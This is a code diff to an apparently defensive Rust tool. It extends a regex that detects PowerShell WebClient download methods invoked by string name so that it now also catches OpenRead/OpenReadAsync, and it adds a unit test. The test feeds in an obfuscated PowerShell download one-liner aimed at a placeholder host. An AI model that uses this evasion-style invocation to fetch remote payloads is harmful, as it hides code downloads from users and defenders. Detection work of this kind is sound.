@@ -304,7 +304,7 @@ static PS_URL_REGEX_SPECS: &[PsUrlRegexSpec] = &[
 #[allow(clippy::expect_used)]
 static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)(?:(?:Task)?Async)?|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
+        r#"(?is)\.\s*\(?\s*["'](?:(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
     )
     .expect("dynamic download invoke")
 });
@@ -5091,6 +5091,15 @@ mod dynamic_download_invoke_tests {
         );
 
         assert_eq!(urls, vec!["https://dyn-taskasync.example/a.ps1"]);
+    }
+
+    #[test]
+    fn dynamic_openreadasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('OpenReadAsync').Invoke('https://dyn-openread.example/a.bin')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-openread.example/a.bin"]);
     }
 }
 
